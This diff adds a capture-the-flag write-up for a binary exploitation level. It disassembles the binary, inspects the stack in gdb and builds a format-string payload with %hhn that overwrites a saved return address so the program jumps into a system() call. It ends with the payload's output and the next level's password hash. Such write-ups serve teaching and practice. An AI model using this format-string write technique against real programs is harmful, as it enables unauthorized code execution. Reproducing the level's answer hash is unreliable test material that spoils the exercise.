@@ -1,0 +1,56 @@
+As usual start with
+>>objdump -d level4
+	08048444 <p>:
+	 8048444:	55                   	push   %ebp
+	 8048445:	89 e5                	mov    %esp,%ebp
+	 8048447:	83 ec 18             	sub    $0x18,%esp
+	 804844a:	8b 45 08             	mov    0x8(%ebp),%eax
+	 804844d:	89 04 24             	mov    %eax,(%esp)
+	 8048450:	e8 eb fe ff ff       	call   8048340 <printf@plt>
+	 8048455:	c9                   	leave
+	 8048456:	c3                   	ret
+
+	08048457 <n>:
+	 8048457:	55                   	push   %ebp
+	 8048458:	89 e5                	mov    %esp,%ebp
+	 804845a:	81 ec 18 02 00 00    	sub    $0x218,%esp
+	 8048460:	a1 04 98 04 08       	mov    0x8049804,%eax
+	 8048465:	89 44 24 08          	mov    %eax,0x8(%esp)
+	 8048469:	c7 44 24 04 00 02 00 	movl   $0x200,0x4(%esp)
+	 8048470:	00
+	 8048471:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
+	 8048477:	89 04 24             	mov    %eax,(%esp)
+	 804847a:	e8 d1 fe ff ff       	call   8048350 <fgets@plt>
+	 804847f:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
+	 8048485:	89 04 24             	mov    %eax,(%esp)
+	 8048488:	e8 b7 ff ff ff       	call   8048444 <p>
+	 804848d:	a1 10 98 04 08       	mov    0x8049810,%eax
+	 8048492:	3d 44 55 02 01       	cmp    $0x1025544,%eax
+	 8048497:	75 0c                	jne    80484a5 <n+0x4e>
+	 8048499:	c7 04 24 90 85 04 08 	movl   $0x8048590,(%esp)
+	 80484a0:	e8 bb fe ff ff       	call   8048360 <system@plt>
+	 80484a5:	c9                   	leave
+	 80484a6:	c3                   	ret
+Like in previous level here is cmp to decide if execute 'system' call, but now the value
+is too huge to overwrite. So use another approach
+See that printf is called from 'p' function.
+Also see that there is 'n' function, which call system.
+Idea is to replace saved eip in 'p' func with addres of 'n' function.
+>>gdb level4
+(gdb) break *0x8048450
+(gdb) run
+(gdb) info frame
+Stack level 0, frame at 0xbffff4e0:
+ eip = 0x8048450 in p; saved eip 0x804848d
+ called by frame at 0xbffff700
+ Arglist at 0xbffff4d8, args:
+ Locals at 0xbffff4d8, Previous frame's sp is 0xbffff4e0
+ Saved registers:
+  ebp at 0xbffff4d8, eip at 0xbffff4dc
+We noticed that saved eip and address of function we want to run differ only in the last byte.
+Just like in previous level find out offsets and value to be placed in.
+Result is command:
+>>python -c "print '\xdc\xf4\xff\xbf' + '%079x' + ('%x ' * 10) + '%hhn'" | ./level4
+sh;#����0000000000000000000000000000000000000000000000000000000000b7ff26b0bffff754 b7fd0ff4 0 0 bffff718 804848d bffff510 200 b7fd1ac0 b7ff37d0 233b6873
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+The last line is a hash of next level.
